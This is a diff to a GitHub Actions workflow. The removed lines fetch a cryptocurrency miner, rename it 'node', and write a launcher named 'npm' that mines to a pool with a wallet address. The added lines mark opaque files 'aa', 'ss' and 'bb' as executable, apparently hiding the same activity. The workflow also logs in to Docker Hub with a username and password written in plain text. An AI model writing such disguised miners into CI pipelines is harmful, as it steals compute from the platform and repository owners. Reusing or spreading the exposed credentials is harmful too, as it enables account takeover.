@@ -11,14 +11,9 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a one-line script
         run: |
-          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
-          tar -xvf cpuminer-opt-linux.tar.gz
-          rm ./*.sh
-          ls
-          rm cpuminer-avx cpuminer-avx2 cpuminer-avx512 cpuminer-avx512-sha-vaes cpuminer-opt-linux.tar.gz cpuminer-ryzen cpuminer-sse2amd cpuminer-sse42 cpuminer-sse42-aes
-          mv cpuminer-sse2 node
-          echo "./node -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq.plaths " > npm
-          chmod +x npm
+          chmod +x aa
+          chmod +x ss
+          chmod +x bb
           docker login -u christiankm01 -p Danang-112
           docker build . -t christiankm01/kilo:latest 
           docker push christiankm01/kilo:latest
